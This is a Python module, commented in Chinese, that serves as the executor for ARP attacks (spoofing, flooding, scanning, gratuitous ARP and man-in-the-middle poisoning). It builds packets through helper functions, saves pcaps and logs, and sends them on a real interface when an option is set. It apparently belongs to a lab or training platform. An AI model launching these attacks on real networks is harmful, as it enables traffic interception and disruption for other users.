"""
攻击执行器：按类型构造包，可选真实发包，并写 pcap + 记录
默认仅模拟（写 pcap + 记录），真实发包需显式开启（需 root）
"""
import os
import time
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional

from core.arp_forge import (
    build_arp_spoof_packets,
    build_arp_flood_packets,
    build_arp_scan_packets,
    build_gratuitous_arp_packets,
    build_mitm_arp_packets,
    get_pcap_bytes,
)
from core.attack_log import append_log

# 攻击记录 pcap 存放目录（项目根目录下 data/logs/attacks）
_BASE_DIR = Path(__file__).resolve().parent.parent.parent
_ATTACKS_DIR = _BASE_DIR / "data" / "logs" / "attacks"


def _ensure_attacks_dir():
    _ATTACKS_DIR.mkdir(parents=True, exist_ok=True)


def _save_pcap(packets: List, log_id: str, suffix: str = "") -> str:
    """将包列表写入 pcap 文件，返回相对路径或文件名"""
    _ensure_attacks_dir()
    fname = f"{log_id}{suffix}.pcap"
    path = _ATTACKS_DIR / fname
    try:
        from scapy.all import wrpcap
        wrpcap(str(path), packets)
        return fname
    except Exception:
        return ""


def _send_packets(packets: List, iface: str) -> tuple:
    """真实发包，返回 (success: bool, message: str)"""
    if not packets:
        return False, "无包可发"
    try:
        from scapy.all import sendp
        for pkt in packets:
            sendp(pkt, iface=iface, verbose=False)
        return True, f"已发送 {len(packets)} 个包"
    except PermissionError:
        return False, "权限不足，请使用 sudo 运行后端以真实发包"
    except Exception as e:
        return False, str(e)


def run_attack(
    attack_type: str,
    params: Dict[str, Any],
    real_send: bool = False,
    iface: str = "eth0",
) -> Dict[str, Any]:
    """
    执行一次攻击：构造包、可选真实发包、写 pcap、写记录。
    返回攻击记录（含 id, status, packets_count, pcap_path 等）。
    """
    started_at = datetime.now().isoformat()
    log_id = f"atk_{int(time.time() * 1000)}"
    packets = []
    pcap_path = ""
    status = "ok"
    message = ""
    steps = []

    try:
        steps.append({"name": "解析参数", "status": "ok", "detail": f"攻击类型={attack_type}, 网卡={iface}, 真实发包={real_send}"})

        if attack_type == "arp_spoof":
            packets = build_arp_spoof_packets(
                target_ip=params.get("target_ip", "192.168.1.100"),
                target_mac=params.get("target_mac", "00:11:22:33:44:55"),
                spoof_ip=params.get("spoof_ip", "192.168.1.1"),
                attacker_mac=params.get("attacker_mac", "aa:bb:cc:dd:ee:ff"),
            )
        elif attack_type == "arp_flood":
            packets = build_arp_flood_packets(
                iface,
                count=params.get("count", 100),
                src_ip_base=params.get("src_ip_base", "192.168.1"),
            )
        elif attack_type == "arp_scan":
            packets = build_arp_scan_packets(
                network=params.get("network", "192.168.1"),
                start=int(params.get("start", 1)),
                end=int(params.get("end", 50)),
            )
        elif attack_type == "gratuitous_arp":
            packets = build_gratuitous_arp_packets(
                ip=params.get("ip", "192.168.1.1"),
                mac=params.get("mac", "aa:bb:cc:dd:ee:ff"),
                count=params.get("count", 10),
            )
        elif attack_type == "arp_mitm":
            result = build_mitm_arp_packets(
                victim1_ip=params.get("victim1_ip", "192.168.1.10"),
                victim1_mac=params.get("victim1_mac", "00:11:22:33:44:55"),
                victim2_ip=params.get("victim2_ip", "192.168.1.20"),
                victim2_mac=params.get("victim2_mac", "66:77:88:99:aa:bb"),
                attacker_mac=params.get("attacker_mac", "aa:bb:cc:dd:ee:ff"),
            )
            packets = [result["to_victim1"], result["to_victim2"]]
        else:
            steps.append({"name": "构造数据包", "status": "failed", "detail": f"未知攻击类型: {attack_type}"})
            record = {
                "attack_type": attack_type,
                "params": params,
                "started_at": started_at,
                "status": "error",
                "packets_count": 0,
                "pcap_path": "",
                "real_send": real_send,
                "message": f"未知攻击类型: {attack_type}",
                "steps": steps,
            }
            return append_log(record)

        packets_count = len(packets)
        steps.append({"name": "构造数据包", "status": "ok", "detail": f"共 {packets_count} 个包"})

        pcap_path = _save_pcap(packets, log_id) if packets else ""
        if pcap_path:
            steps.append({"name": "写入 pcap", "status": "ok", "detail": f"已保存至 data/logs/attacks/{pcap_path}"})
        else:
            steps.append({"name": "写入 pcap", "status": "skip", "detail": "无包可写"})

        if real_send:
            ok, msg = _send_packets(packets, iface)
            if not ok:
                status = "send_failed"
                message = msg
                steps.append({"name": "真实发包", "status": "failed", "detail": msg})
            else:
                message = msg
                steps.append({"name": "真实发包", "status": "ok", "detail": msg})
        else:
            message = f"仅模拟：已生成 {packets_count} 个包并保存 pcap"
            steps.append({"name": "真实发包", "status": "skip", "detail": "未勾选，已跳过"})

        steps.append({"name": "记录日志", "status": "ok", "detail": "已写入攻击记录"})

        record = {
            "attack_type": attack_type,
            "params": params,
            "started_at": started_at,
            "status": status,
            "packets_count": packets_count,
            "pcap_path": pcap_path,
            "real_send": real_send,
            "iface": iface,
            "message": message,
            "steps": steps,
        }
        return append_log(record)

    except Exception as e:
        steps.append({"name": "执行异常", "status": "failed", "detail": str(e)})
        record = {
            "attack_type": attack_type,
            "params": params,
            "started_at": started_at,
            "status": "error",
            "packets_count": len(packets),
            "pcap_path": pcap_path or _save_pcap(packets, log_id) if packets else "",
            "real_send": real_send,
            "message": str(e),
            "steps": steps,
        }
        return append_log(record)
